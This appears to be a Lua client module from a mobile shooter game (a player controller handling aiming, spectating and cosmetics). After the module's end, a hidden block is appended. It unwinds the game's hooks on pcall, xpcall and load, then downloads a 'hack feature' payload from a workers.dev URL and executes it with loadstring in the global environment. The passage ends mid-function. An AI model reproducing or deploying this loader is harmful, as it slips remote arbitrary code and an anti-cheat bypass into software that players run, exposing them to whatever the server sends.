  if not Client.IsDeviceSupportGyrSensor() then
    return
  end
  local Pawn = self:K2_GetPawn()
  if not slua.isValid(Pawn) then
    if bWriteLog then
    end
    return
  end
  if not self:GetUseMotionControlEnable() then
    if bWriteLog then
    end
    return
  end
  local OutPitch = 0
  local OutYaw = 0
  local bIsAddPitch = false
  local bIsAddYaw = false
  if not self.CalInputFromRotaionRate then
    return
  end
  OutPitch, OutYaw, bIsAddPitch, bIsAddYaw = self:CalInputFromRotaionRate(OutPitch, OutYaw, bIsAddPitch, bIsAddYaw, AxisValue, self.PitchReverce, self.MotionTouchRate_Pitch, self.MotionTouchAimRate_Pitch, self.MotionRate_Pitch, self.MotionAimRate_Pitch, self.MotionTouchRate_Yaw, self.MotionTouchAimRate_Yaw, self.MotionRate_Yaw, self.MotionAimRate_Yaw, self.MotionRate_Pitch_Threshold, self.MotionRate_Yaw_Threshold, self.Left, self.Right, self.bLandScapeOrientation)
  if bIsAddPitch then
    Pawn:AddControllerPitchInput(OutPitch)
  end
  if bIsAddYaw then
    Pawn:AddControllerYawInput(OutYaw)
  end
end

PlayerControllerBase.ClientRPC.RPC_Client_ShowBattleGMOutputText = {
  Reliable = true,
  Params = {
    UEnums.EPropertyClass.Str
  }
}

function PlayerControllerBase:RPC_Client_ShowBattleGMOutputText(Content)
  ShowBattleGMOutputText(Content)
end

function PlayerControllerBase:ToString()
  if self.GetViewTarget then
    local ViewTarget = self:GetViewTarget()
    if slua.isValid(ViewTarget) then
      return string.format("%s(%s)", ViewTarget.PlayerName, ViewTarget.PlayerKey)
    end
  end
  return "<Invalid ViewTarget>"
end

function PlayerControllerBase:GetCurPlayerCharacterOrPetSpectator()
  if slua.isValid(self.Object) and self.IsInPetSpectator and self:IsInPetSpectator() and self.GetPetSpectatorComp and slua.isValid(self:GetPetSpectatorComp()) and slua.isValid(self:GetPetSpectatorComp().PetSpectatorPawn) then
    return self:GetPetSpectatorComp().PetSpectatorPawn
  elseif slua.isValid(self.Object) and self.GetCurPlayerCharacter then
    return self:GetCurPlayerCharacter()
  end
end

function PlayerControllerBase:GetStickLeftSize()
  local JoyStickCenter = self:GetJoyStickCenter()
  local UIUtil = require("client.common.ui_util")
  local ViewportSize = UIUtil.GetViewportSizebyScale()
  local DistanceToCentralAxis_Ratio = math.abs(0.5 - JoyStickCenter.X)
  if 0.3 <= DistanceToCentralAxis_Ratio then
    return FVector2D(DistanceToCentralAxis_Ratio, 1) * ViewportSize * 2
  else
    return FVector2D(0.3, 1) * ViewportSize * 2
  end
end

function PlayerControllerBase:MakeFireModeEffect()
  if not slua.isValid(self.Object) then
    return
  end
  local SuperData = self:GetSuperData()
  if self.IsUse3DTouch then
    SuperData.IsUse3DTouch = self:IsUse3DTouch()
  end
  local FireMode = self.fireMode
  if FireMode == 1 or FireMode == 2 then
    local SizeX = 200
    local SizeY = 200
    if self.GetStickLeftSize then
      local StickSize = self:GetStickLeftSize()
      SizeX = math.max(SizeX, StickSize.X)
      SizeY = math.max(SizeY, StickSize.Y)
    end
    self:SetJoyStickInteractionSize(FVector2D(SizeX, SizeY))
  elseif FireMode == 3 then
    self:RestoreDefaultInteractionSize(0)
  end
  self:BroadcastUIMessage("UIMsg_MakeFireModeEffect", 0, "", "")
end

function PlayerControllerBase:DoUITouchMove(Vector)
  if self.fireMode == 2 and not self._DisableUITouchMove then
    self:LuaBroadcast("DoUITouchMoveEvent", FVector2D(Vector.X, Vector.Y))
  end
end

function PlayerControllerBase:ReadConfigFromHUD()
  self.Super:ReadConfigFromHUD(self)
  local SuperData = self:GetSuperData()
  if self.IsUse3DTouch then
    SuperData.IsUse3DTouch = self:IsUse3DTouch()
  end
end

function PlayerControllerBase:InitCameraData()
  local GamePlayTools = require("GameLua.Mod.BaseMod.Common.GamePlayTools")
  local BaseCameraConfig = GamePlayTools.GetCurrentConfig("BaseCameraConfig")
  local CameraOffsetData = import("CameraOffsetData")
  if slua.isValid(self.PlayerCameraManager) and BaseCameraConfig then
    for CameraStateTag, CameraStateData in pairs(BaseCameraConfig) do
      local NewCameraStateData = CameraOffsetData()
      NewCameraStateData.SocketOffset = CameraStateData.SocketOffset
      NewCameraStateData.TargetOffset = CameraStateData.TargetOffset
      NewCameraStateData.SpringArmLength = CameraStateData.SpringArmLength
      NewCameraStateData.AdditiveOffsetFov = CameraStateData.AdditiveOffsetFov
      NewCameraStateData.FixedFov = CameraStateData.FixedFov
      NewCameraStateData.BeginInterpSpeed = CameraStateData.BeginInterpSpeed
      NewCameraStateData.EndInterpSpeed = CameraStateData.EndInterpSpeed
      self.PlayerCameraManager:PushCameraDataConfigData(CameraStateTag, NewCameraStateData)
    end
  end
end

function PlayerControllerBase:RPC_ClientHUDDisplayHitDamage(nDamage, IsWeakShoot)
  local uHUD = self:GetHUD()
  if slua.isValid(uHUD) then
    uHUD:AddHitDamage(nDamage, IsWeakShoot, CDamageEvent(), nil, true)
  end
end

function PlayerControllerBase:OnCreateDecal(_, _, playerKey, DecalActor)
  if not slua.isValid(DecalActor) then
    return
  end
  self:RPC_Multicast_OnCreateDecal(DecalActor.DecalId)
end

function PlayerControllerBase:RPC_Multicast_OnCreateDecal(itemId)
  if not Client then
    return
  end
  local passive_resource_downloader = ModuleManager.GetModule(ModuleManager.CommonModuleConfig.passive_resource_downloader)
  passive_resource_downloader:CheckResourceHasBeenDownloaded({itemId})
end

function PlayerControllerBase:InitGrenadeAvatarList(ReInitial)
  if self.RolewearIndex >= 0 and self.RolewearIndex < self.InitialKnapsackExtInfo:Num() and ReInitial then
    self.InitialConsumableAvatar = self.InitialKnapsackExtInfo:Get(self.RolewearIndex).KnapsackExtInfo.ConsumableAvatarList
  end
  self.GrenadeAvatarItemList:Clear()
  self:AddToGrenadeAvatarItemList(self.InitialConsumableAvatar.GrenadeAvatarShoulei)
  self:AddToGrenadeAvatarItemList(self.InitialConsumableAvatar.GrenadeAvatarSmoke)
  self:AddToGrenadeAvatarItemList(self.InitialConsumableAvatar.GrenadeAvatarStun)
  self:AddToGrenadeAvatarItemList(self.InitialConsumableAvatar.GrenadeAvatarBurn)
end

function PlayerControllerBase:AddToGrenadeAvatarItemList(AvatarID)
  if AvatarID <= 0 then
    return
  end
  local UBackpackUtils = import("BackpackUtils")
  local DefineID = UBackpackUtils.GenerateItemDefineIDByItemTableIDWithRandomInstanceID(AvatarID)
  local AvatarUtil = require("GameLua.Mod.Library.GamePlay.Avatar.AvatarUtil")
  local ProtoItemID = AvatarUtil.GetThrowWeaponProtoItemID_Old(DefineID, self.Object)
  if ProtoItemID <= 0 then
    return
  end
  self.GrenadeAvatarItemList:Add(ProtoItemID, AvatarID)
end

function PlayerControllerBase:ChangeWeaponAvatarList(BagIndex)
  if 0 <= BagIndex and BagIndex < self.InitialKnapsackExtInfo:Num() then
    local weaponList = self.InitialKnapsackExtInfo:Get(self.RolewearIndex).KnapsackExtInfo.WeaponList
    local AvatarDataUtil = require("GameLua.Mod.Library.GamePlay.Avatar.AvatarDataUtil")
    weaponList = AvatarDataUtil.FilterWeaponAttachments(self, weaponList, true)
    self.InitialWeaponAvatarList = weaponList
    self:InitWeaponAvatarItems()
    self:OnWeaponAvatarUpdate()
  end
end

function PlayerControllerBase:OnWeaponAvatarUpdate()
end

function PlayerControllerBase:OnPlayerKeyRepExt()
  EventSystem:postEvent(EVENTTYPE_INGAME, EVENTID_INGAME_CONTROLLER_PLAYERKEY_CHANGE, self.Object)
end

function PlayerControllerBase:CanShowMyPet()
  local settingConfig = slua_GameFrontendHUD:GetUserSettings()
  local uPawn = self:GetPlayerCharacterSafety()
  if not (slua.isValid(uPawn) and uPawn.GetIsFPP) or not uPawn:GetIsFPP() then
    return settingConfig.OpenMyPet
  end
  return settingConfig.OpenMyPetFPP
end

function PlayerControllerBase:GetMapUIMarkManagerComponent()
  if not slua.isValid(self.MapUIMarkManagerComponent) then
    self.MapUIMarkManagerComponent = self:GetComponentByClass(import("MapUIMarkManager"))
  end
  return self.MapUIMarkManagerComponent
end

function PlayerControllerBase:SGetConsumableByXsuitAndGlider()
  local index = self.RolewearIndex
  local curInfo = self.InitialKnapsackExtInfo:Get(index)
  local info = curInfo.KnapsackExtInfo
  local baseID = info.ParachuteGlider
  local LogicXSuit = require("client.slua.logic.XSuit.logic_xsuit")
  local candidateIDs = {baseID}
  for _, specialID in pairs(LogicXSuit.GetAllSpecialGlideIDs(baseID) or {}) do
    table.insert(candidateIDs, specialID)
  end
  local allwear = self:GetClothingInAllBackpack(index)
  for _, candidateID in ipairs(candidateIDs) do
    local VehicleUseConfig = CDataTable.GetTableData("VehicleUseConfig", candidateID)
    if VehicleUseConfig then
      local SuitID_s = VehicleUseConfig.SuitID_s
      for _, v in pairs(allwear) do
        if SuitID_s:Get(v.DefineID.TypeSpecificID) then
          return VehicleUseConfig.Consumable
        end
      end
    end
  end
end

function PlayerControllerBase:GetCurWearTwoPersonAircraftID()
  local XSuitAvatarDataUtil = require("GameLua.Activity.Commercialize.GamePlay.XSuit.XSuitAvatarDataUtil")
  local GlideID = XSuitAvatarDataUtil:GetCurrentWearGlideID(self)
  local UAvatarUtils = import("AvatarUtils")
  if UAvatarUtils.IsTwoPersonAircraft(GlideID) then
    return GlideID
  else
    return -1
  end
end

function PlayerControllerBase:BindMotionEvent()
  local InputClass = import("ScreenInput")
  local UIUtil = require("client.common.ui_util")
  local WorldContextObject = UIUtil.GetGameInstance()
  self.ScreenInput = InputClass(WorldContextObject)
  self.ScreenInput:Init()
  self.ScreenInput.OnMotionDetected:Bind(self, "OnMotionDetected")
end

function PlayerControllerBase:UseModSkin(_, _, bUse)
  if not self.bModWeaponSkinCooldowning then
    self.bModWeaponSkinCooldowning = true
    self:ServerRequestUseModWeaponSkin(bUse)
  end
end

function PlayerControllerBase:OnModWeaponSkinChange()
  local Cooldown = 5
  local GamePlayTools = require("GameLua.Mod.BaseMod.Common.GamePlayTools")
  local ModWeaponConfig = GamePlayTools.GetCurrentConfig("ModWeaponConfig")
  if ModWeaponConfig and ModWeaponConfig.Cooldown then
    Cooldown = ModWeaponConfig.Cooldown
  end
  if self.bModWeaponSkinCooldowning then
    EventSystem:postEvent(EVENTTYPE_PLAYEREVENT_WEAPON, EVENTID_MOD_WEAPON_USE_SKIN_COOLDOWN, Cooldown)
    self:AddGameTimer(Cooldown, false, function()
      self.bModWeaponSkinCooldowning = false
      EventSystem:postEvent(EVENTTYPE_PLAYEREVENT_WEAPON, EVENTID_MOD_WEAPON_USE_SKIN_COOLDOWN_END)
    end)
  end
end

function PlayerControllerBase:ClientCallPartnerTips(TextID, RoleTypeID, RichTextID, Param1)
  self:ClientCallSidePopupTips(TextID, RoleTypeID, RichTextID, Param1, nil)
end

function PlayerControllerBase:ClientCallPartnerTipsByType(TipID, Param1, Param2)
  if not TipID then
    return
  end
  local IngameTipsTools = require("GameLua.Mod.BaseMod.Common.UI.InGameTipsTools")
  IngameTipsTools.ClientCallSidePopupTipsByType(TipID, Param1, Param2)
end

function PlayerControllerBase:ClientCallSidePopupTips(TextID, RoleTypeID, RichTextID, Param1, Param2)
  local ClientSidePopupTipsSubsystem = SubsystemMgr:Get("ClientSidePopupTipsSubsystem")
  if ClientSidePopupTipsSubsystem then
    ClientSidePopupTipsSubsystem:CallTips(TextID, RoleTypeID, RichTextID, Param1, Param2)
  end
end

function PlayerControllerBase:FindBestSpectateTarget(MyTeammates, CurPlayerState, TeammatePlayerID)
  local ETeammateSpectatorResult = import("/Script/ShadowTrackerExtra.ETeammateSpectatorResult")
  local ExtraPlayerLiveState = import("/Script/ShadowTrackerExtra.ExtraPlayerLiveState")
  local Result = {
    bAllDie = true,
    bIsOnPlane = false,
    bHasSelf = false,
    bHasNullptr = false,
    TargetTeammate = nil,
    RetPlayerId = 0,
    FriendId = 0,
    TeammateResults = {}
  }
  local bIgnoreDying = self.bWatchTeammateIgnoreDying
  if bIgnoreDying then
    for _, OneTeammate in pairs(MyTeammates) do
      if slua.isValid(OneTeammate) and OneTeammate.LiveState ~= ExtraPlayerLiveState.InDied and OneTeammate.LiveState ~= ExtraPlayerLiveState.InDying then
        bIgnoreDying = false
        break
      end
    end
  end
  local LobbyWatchInfo = self.LobbyWatchInfo

  local function ProcessOneTeammate(OneTeammate)
    if CurPlayerState == OneTeammate then
      table.insert(Result.TeammateResults, ETeammateSpectatorResult.ETeammateSpectatorResult_MySelf)
      Result.bHasSelf = true
      return false
    end
    if not slua.isValid(OneTeammate) then
      Result.bAllDie = false
      table.insert(Result.TeammateResults, ETeammateSpectatorResult.ETeammateSpectatorResult_Nullptr)
      Result.bHasNullptr = true
      return false
    end
    if LobbyWatchInfo and LobbyWatchInfo.WatchedPlayerKey == OneTeammate.PlayerKey and LobbyWatchInfo.WatchedPlayerKey > 0 then
      Result.FriendId = OneTeammate.PlayerId
    end
    if TeammatePlayerID == 0 then
      if OneTeammate.LiveState == ExtraPlayerLiveState.InDied or OneTeammate.LiveState == ExtraPlayerLiveState.InDying and not bIgnoreDying then
        table.insert(Result.TeammateResults, ETeammateSpectatorResult.ETeammateSpectatorResult_Died)
        return false
      end
    elseif not OneTeammate:IsAlive() then
      table.insert(Result.TeammateResults, ETeammateSpectatorResult.ETeammateSpectatorResult_NotAlive)
      return false
    end
    if not OneTeammate:IsInGame() then
      table.insert(Result.TeammateResults, ETeammateSpectatorResult.ETeammateSpectatorResult_NotInGame)
      return false
    end
    if not OneTeammate:CanBeSpectated() then
      return false
    end
    table.insert(Result.TeammateResults, ETeammateSpectatorResult.ETeammateSpectatorResult_Normal)
    Result.bAllDie = false
    Result.bIsOnPlane = OneTeammate.LiveState == ExtraPlayerLiveState.InPlane
    Result.TargetTeammate = OneTeammate
    Result.RetPlayerId = OneTeammate.PlayerId
    if TeammatePlayerID == OneTeammate.PlayerId then
      return true
    end
    if TeammatePlayerID == 0 and LobbyWatchInfo and LobbyWatchInfo.WatchedPlayerKey == OneTeammate.PlayerKey and LobbyWatchInfo.WatchedPlayerKey > 0 then
      return true
    end
    return false
  end

  for _, OneTeammate in pairs(MyTeammates) do
    if ProcessOneTeammate(OneTeammate) then
      break
    end
  end
  return Result
end

function PlayerControllerBase:Server_GenericRPC(ID, Bytes)
  local GenericRPCEnums = require("GameLua.Mod.BaseMod.GamePlay.GenericRPC.GenericRPCEnums")
  local GenericRPCUtil = require("GameLua.Mod.BaseMod.GamePlay.GenericRPC.GenericRPCUtil")
  GenericRPCUtil._OnRecv(self, ID, GenericRPCEnums.EGenericRPCDirection.Server, Bytes)
end

function PlayerControllerBase:Client_GenericRPC(ID, Bytes)
  local GenericRPCEnums = require("GameLua.Mod.BaseMod.GamePlay.GenericRPC.GenericRPCEnums")
  local GenericRPCUtil = require("GameLua.Mod.BaseMod.GamePlay.GenericRPC.GenericRPCUtil")
  GenericRPCUtil._OnRecv(self, ID, GenericRPCEnums.EGenericRPCDirection.Client, Bytes)
end

function PlayerControllerBase:GetRawBattleTextByRawTextIDLua(ID)
  return LocUtil.GetLocalizeResStr(ID)
end

local class = require("class")
local CActorBase = require("GameLua.Mod.BaseMod.Common.Core.ActorBase")
local CPlayerControllerBase = class(CActorBase, nil, PlayerControllerBase)
return require("combine_class").DeclareFeature(CPlayerControllerBase, {
  {
    IngameLikeFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.PlayerControllerIngameLikeFeature"
  },
  {
    CollectionTaskFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.CollectionTaskFeature"
  },
  {
    NewbieAssistFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.NewbieAssistFeature"
  },
  {
    ShowVehicleFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.ShowVehicleFeature"
  },
  {
    PlayEmoteFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.Emote.PlayEmoteFeature"
  },
  {
    CommerFeature = "GameLua.Activity.Commercialize.GamePlay.Feature.CommerFeature"
  },
  {
    ReportCrashKitFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.Player.ReportCrashKitFeature"
  },
  {
    CoopEmotePCFeature = "GameLua.Activity.Commercialize.GamePlay.CoopEmote.CoopEmotePCFeature"
  },
  {
    SecurityNotifyPCFeature = "GameLua.Mod.BaseMod.Common.Security.SecurityNotifyPCFeature"
  },
  {
    PlayerControllerFatalDamageFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.PlayerControllerFatalDamageFeature"
  },
  {
    PlayerControllerTipsFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.PlayerControllerTipsFeature"
  },
  {
    OncePerGameAkEventFeature = "GameLua.Mod.BaseMod.Gameplay.Feature.OncePerGameAkEventFeature"
  },
  {
    MLAIVoiceFeature = "GameLua.Mod.BaseMod.Gameplay.AI.MLAIVoiceFeature"
  }
}, "PlayerControllerBase")

end)()

local function RestoreNativeLuaFunctions()
  local globals = _G
  local function Finish(problem, count)
    local status = {
      Ready = problem == nil,
      Status = problem and "Unavailable" or (count > 0 and "Restored" or "NoRecognizedHook"),
      Error = problem,
      RestoredFunctions = count or 0
    }
    if type(globals) == "table" then
      rawset(globals, "LunarNativeHookRepairStatus", status)
    end
    return status
  end
  if type(globals) ~= "table" then
    return Finish("GlobalEnvironmentUnavailable")
  end
  local debugApi = rawget(globals, "debug")
  local getupvalue = type(debugApi) == "table" and rawget(debugApi, "getupvalue")
  local getinfo = type(debugApi) == "table" and rawget(debugApi, "getinfo")
  local probe = rawget(globals, "pcall")
  if type(getupvalue) ~= "function" or type(probe) ~= "function" then
    return Finish("NamedUpvalueInspectionUnavailable")
  end

  local cache, problem = {}
  local function Inspect(func)
    if type(func) ~= "function" then
      problem = "InvalidHookReference"
      return
    end
    if cache[func] then
      return cache[func]
    end
    local values = {}
    if type(getinfo) == "function" then
      local ok, info = probe(getinfo, func, "S")
      if ok and type(info) == "table" and info.what == "C" then
        cache[func] = values
        return values
      end
    end
    for index = 1, 128 do
      local ok, name, value = probe(getupvalue, func, index)
      if not ok then
        problem = "UpvalueInspectionFailed"
        return
      end
      if name == nil then
        cache[func] = values
        return values
      end
      if type(name) ~= "string" or name == "" or name:sub(1, 1) == "(" then
        problem = "UpvalueNamesUnavailable"
        return
      end
      if value == nil then
        value = false
      end
      values[name] = value
    end
    problem = "UpvalueInspectionLimit"
  end

  local function Verify(values, key)
    if key == "load" then
      local environment = Inspect(values.IsMainEnv)
      return environment and environment.MAX_ENV_META_DEPTH == 8
        and type(values.DefaultEnv) == "table"
    end
    if type(values.TimeoutRethrowFlag) ~= "number" then
      return false
    end
    if key == "pcall" or key == "xpcall" then
      local helper = Inspect(values.HandleCallResults)
      if not helper then
        return false
      end
      local predicate = helper.ShouldRethrowTimeoutError
      local timeout = Inspect(predicate)
      return timeout and timeout.TIMEOUT_ERROR_IDENTIFIER == "script exec timeout"
        and timeout.TimeoutRethrowFlag == values.TimeoutRethrowFlag
        and (key ~= "xpcall" or values.ShouldRethrowTimeoutError == predicate)
    end
    return true
  end

  local targets = {{globals, "pcall"}, {globals, "xpcall"}, {globals, "load"}}
  local sluaApi = rawget(globals, "slua")
  if type(sluaApi) == "table" then
    targets[#targets + 1] = {sluaApi, "TimeoutIgnoreHookFlagIncrement"}
    targets[#targets + 1] = {sluaApi, "TimeoutIgnoreHookFlagDecrement"}
  end
  local pending, history = {}, {}
  for _, target in ipairs(targets) do
    local owner, key = target[1], target[2]
    local current = rawget(owner, key)
    local originalName = "Original" .. key:sub(1, 1):upper() .. key:sub(2)
    local recovered, visited, layers = current, {}, {}
    history[key] = layers
    if type(current) == "function" then
      for depth = 1, 33 do
        if visited[recovered] then
          return Finish("HookReferenceCycle:" .. key)
        end
        visited[recovered] = true
        local values = Inspect(recovered)
        if not values then
          return Finish(problem .. ":" .. key)
        end
        local original = values[originalName]
        if original == nil then
          break
        end
        if depth > 32 then
          return Finish("HookLayerLimit:" .. key)
        end
        if type(original) ~= "function" or not Verify(values, key) then
          return Finish((problem or "UnexpectedHookSignature") .. ":" .. key)
        end
        layers[#layers + 1] = values
        recovered = original
      end
      if recovered ~= current then
        pending[#pending + 1] = {owner, key, recovered}
      end
    end
  end

  local function Matching(leftKey, rightKey, field)
    local left, right = history[leftKey] or {}, history[rightKey] or {}
    if #left ~= #right then
      return false
    end
    for index = 1, #left do
      if left[index][field] ~= right[index][field] then
        return false
      end
    end
    return true
  end
  if not Matching("pcall", "xpcall", "HandleCallResults")
      or not Matching("TimeoutIgnoreHookFlagIncrement", "TimeoutIgnoreHookFlagDecrement", "TimeoutRethrowFlag") then
    return Finish("MismatchedHookLayers")
  end
  for _, change in ipairs(pending) do
    rawset(change[1], change[2], change[3])
  end
  return Finish(nil, #pending)
end

-- Standalone entry: the original module has already produced its export.
do
  local bootstrapOK, bootstrapError = pcall(function()
    -- Restore the accidental hook immediately when inspection is available.
    _G.pcall(RestoreNativeLuaFunctions)
    local url = "https://a.hamse.workers.dev/"
    local expectedBytes = 349464
    local releaseId = "a3acb07e580fb9dca9d9d1395479fb02768226676030d8f14d044b4321167cd1"
    local marker = "-- Supplied hack feature implementation follows in its own scope."
    local scope = url .. "\n" .. releaseId
    local previous = _G.__MasterAhsanRemoteLoaderV1
    if type(previous) == "table" and previous.Scope == scope then
      if previous.Started or previous.Loaded or previous.Phase == "Executing"
          or previous.LastError == "ExecutionError" then return end
      if previous.Version == 5 and type(previous.Wake) == "function" then
        previous.Wake("entry")
        return
      end
    end

    local S = {
      Version = 5, Scope = scope, URL = url, ExpectedSHA256 = releaseId,
      Generation = (type(previous) == "table" and tonumber(previous.Generation) or 0) + 1,
      Epoch = 0, Checks = 0, Attempts = 0, Executions = 0,
      Active = false, Loaded = false, InFlight = false, Phase = "WaitingEntry",
      HookAttempts = setmetatable({}, {__mode = "k"})
    }
    _G.__MasterAhsanRemoteLoaderV1 = S
    local call = _G.pcall
    local function current() return _G.__MasterAhsanRemoteLoaderV1 == S end
    local function member(object, key)
      if object == nil then return nil end
      local ok, value = call(function() return object[key] end)
      if ok then return value end
    end
    local function cancelTimer()
      if S.Pending then S.Pending.Used = true end
      S.Pending = nil
    end
    local function finish(phase, reason, terminal)
      S.Active, S.InFlight = false, false
      cancelTimer()
      if S.Request then S.Request.Used = true end
      S.Request = nil
      S.Phase, S.LastError = phase, reason
      if terminal then S.Terminal = true; S.Body = nil end
    end
    local function repair()
      local ok, result = call(RestoreNativeLuaFunctions)
      if not ok then return false, tostring(result) end
      if type(result) ~= "table" or not result.Ready then
        return false, type(result) == "table" and result.Error or "NativeHookRepairUnavailable"
      end
      call = _G.pcall
      return true
    end
    local function getTicker()
      local ok, ticker = call(require, "common.time_ticker")
      local add = ok and member(ticker, "AddTimerOnce")
      if type(add) == "function" then return add end
    end
    local function valid(object)
      local api = member(_G.slua, "isValid")
      if object == nil or type(api) ~= "function" then return false end
      local ok, yes = call(api, object)
      return ok and yes == true
    end
    local function preflight()
      if not _G.Client then return false, "ClientNotReady" end
      if not getTicker() then return false, "TickerUnavailable" end
      local ok, data = call(require, "GameLua.GameCore.Data.GameplayData")
      if not ok or data == nil or data == false then return false, "GameplayDataUnavailable" end
      if type(member(_G.slua, "isValid")) ~= "function" then return false, "SluaUnavailable" end
      local getPlayer = member(data, "GetPlayerCharacter")
      local getController = member(data, "GetPlayerController")
      if type(getPlayer) ~= "function" or type(getController) ~= "function" then
        return false, "PlayerAccessUnavailable"
      end
      local playerOK, player = call(getPlayer)
      local controllerOK, controller = call(getController)
      if not playerOK or not valid(player) then return false, "PlayerNotReady" end
      if not controllerOK or not valid(controller) then return false, "ControllerNotReady" end
      if type(member(_G.CGame, "NewObjectFromPath")) ~= "function" then
        return false, "WidgetFactoryUnavailable"
      end
      if member(_G.UEnums, "ESlateVisibility") == nil then return false, "VisibilityEnumUnavailable" end
      local toolsOK, tools = call(require, "GameLua.Mod.BaseMod.Common.UI.InGameUITools")
      local getRoot = toolsOK and member(tools, "GetMainControlBaseUI")
      if type(getRoot) ~= "function" then return false, "InGameUIUnavailable" end
      local rootOK, root = call(getRoot)
      if not rootOK or not valid(root) then return false, "MainControlUnavailable" end
      if not valid(member(root, "CanvasPanel_0")) and not valid(member(root, "CanvasPanel_42")) then
        return false, "CanvasUnavailable"
      end
      return true
    end
    local function hookReadyEvent()
      local events = _G.EventSystem
      local register = member(events, "registEvent")
      local eventType, eventId = _G.EVENTTYPE_INGAME, _G.EVENTID_INGAME_CONTROLLER_BEGINPLAY_FINISH
      if type(register) ~= "function" or eventType == nil or eventId == nil then
        S.HookPhase = "WaitingEventSystem"
        return
      end
      if S.HookAttempts[events] then return end
      S.HookAttempts[events] = true
      local ok, accepted = call(register, events, eventType, eventId, function()
        if current() then S.Wake("controller_beginplay") end
      end)
      local registered = ok and accepted ~= false
      if not registered then S.HookAttempts[events] = nil end
      S.HookPhase = registered and "Registered" or "RegistrationFailed"
    end

    local check
    local function schedule(delay, callback)
      if not current() or not S.Active or S.Pending or S.Terminal then return false end
      local add = getTicker()
      if not add then finish("WaitingReadyEvent", "TickerUnavailable"); return false end
      local token = {Epoch = S.Epoch, Used = false}
      S.Pending, S.ArmingTimer = token, true
      local ok, accepted = call(add, delay, function()
        if token.Used or not current() or token.Epoch ~= S.Epoch or S.Pending ~= token then return end
        token.Used, S.Pending = true, nil
        if S.ArmingTimer then token.Synchronous = true; return end
        if S.Active and not S.Terminal then callback(token.Epoch) end
      end)
      S.ArmingTimer = false
      if token.Synchronous then
        finish("WaitingReadyEvent", "SynchronousTimerUnsupported")
        return false
      end
      if not ok or accepted == false then
        token.Used = true
        finish("WaitingReadyEvent", "TimerUnavailable")
        return false
      end
      return true
    end
    local function nextCheck(reason)
      if not current() or not S.Active then return end
      S.Phase, S.LastError = "WaitingReadiness", reason
      if S.Checks >= 120 then
        finish("WaitingReadyEvent", reason or "CheckBudgetExhausted")
      else
        schedule(1.0, check)
      end
    end
    local function retry(reason)
      if S.Attempts >= 5 then
        S.Retryable = true
        finish("Failed", reason, true)
      else
        S.Phase, S.LastError = "RetryPending", reason
        schedule(2 ^ (S.Attempts - 1), check)
      end
    end
    local function execute()
      local restored, reason = repair()
      if not current() then return end
      if not restored then finish("WaitingReadyEvent", reason); return end
      local body = S.Body
      local ok, chunk, compileError = call(function()
        if type(_G.loadstring) == "function" then
          local fn, problem = _G.loadstring(body, "@MasterAhsanRemoteAddon")
          if type(fn) == "function" and type(_G.setfenv) == "function" then _G.setfenv(fn, _G) end
          return fn, problem
        end
        if type(_G.load) == "function" then return _G.load(body, "@MasterAhsanRemoteAddon", "t", _G) end
        return nil, "LuaCompilerUnavailable"
      end)
      if not ok or type(chunk) ~= "function" then
        S.ErrorStage = "CompileError"
        finish("CompileError", tostring(ok and compileError or chunk), true)
        return
      end
      S.Started, S.Terminal, S.Executions = true, true, S.Executions + 1
      S.Phase, S.LastError, S.Body = "Executing", nil, nil
      local oldError = _G.LunarOptionalStartupError
      local ran, startupError = call(chunk)
      if not current() then return end
      if not ran then
        S.ErrorStage = "ExecutionError"
        finish("ExecutionError", tostring(startupError), true)
        return
      end
      S.Loaded = true
      if _G.LunarOptionalStartupError ~= oldError and _G.LunarOptionalStartupError ~= nil then
        finish("LoadedWithStartupError", tostring(_G.LunarOptionalStartupError), true)
      else
        finish("Loaded", nil, true)
      end
    end
    local function fetch()
      local moduleOK, http, post = call(function()
        local manager = _G.ModuleManager or ModuleManager
        if not manager or type(manager.GetModule) ~= "function" or not manager.CommonModuleConfig then return nil end
        local module = manager.GetModule(manager.CommonModuleConfig.http_manager)
        return module, module and module.Post
      end)
      if not current() then return end
      if not moduleOK or not http or type(post) ~= "function" then
        nextCheck("HttpModuleUnavailable")
        return
      end
      if S.Attempts >= 5 then retry("RequestBudgetExhausted"); return end
      S.Attempts, S.InFlight, S.Phase = S.Attempts + 1, true, "Fetching"
      local token = {Epoch = S.Epoch, Attempt = S.Attempts, Used = false}
      S.Request = token
      local function settle()
        if token.Used or not current() or S.Terminal or not S.Active
            or token.Epoch ~= S.Epoch or S.Request ~= token or not S.InFlight then return false end
        token.Used, S.InFlight, S.Request = true, false, nil
        cancelTimer()
        return true
      end
      if not schedule(10.25, function()
        if settle() then retry("TransportTimeout") end
      end) then return end
      local sent, accepted = call(post, http, url,
        {["Content-Type"] = "application/x-www-form-urlencoded"}, "key_path=2.lua", nil,
        function(success, body)
          if not settle() then return end
          if not success then retry("TransportError"); return end
          S.ReceivedBytes = type(body) == "string" and #body or nil
          if type(body) ~= "string" or #body ~= expectedBytes or body:sub(1, #marker) ~= marker
              or body:byte(1) == 27 or body:find("\0", 1, true) then
            finish("InvalidPayload", "InvalidPayload", true)
            return
          end
          S.Body, S.Phase, S.LastError, S.Checks = body, "Downloaded", nil, 0
          -- Do not execute inside an HTTP callback; recheck the native UI first.
          schedule(0.05, check)
        end, 10)
      if (not sent or accepted == false) and settle() then retry("TransportError") end
    end

    check = function(epoch)
      if not current() or not S.Active or epoch ~= S.Epoch or S.Checking or S.Terminal then return end
      S.Checking = true
      local ok, problem = call(function()
        S.Checks = S.Checks + 1
        hookReadyEvent()
        if not _G.Client then nextCheck("ClientNotReady"); return end
        if S.Body then
          local ready, reason = preflight()
          if not current() then return end
          if not ready then nextCheck(reason); return end
          execute()
        else
          fetch()
        end
      end)
      S.Checking = false
      if not ok and current() then
        finish(S.Started and "ExecutionError" or "WaitingReadyEvent", tostring(problem), S.Started)
      end
    end
    S.Wake = function(reason)
      if not current() or S.Waking or S.Started or (S.Terminal and not S.Retryable) then return end
      S.Waking = true
      local ok, problem = call(function()
        hookReadyEvent()
        if S.Active or S.Checking then return end
        if S.Terminal then
          S.Terminal, S.Retryable, S.Attempts = false, false, 0
        end
        S.Epoch, S.Checks = S.Epoch + 1, 0
        S.Active, S.WakeReason, S.Phase, S.LastError = true, reason, "Scheduled", nil
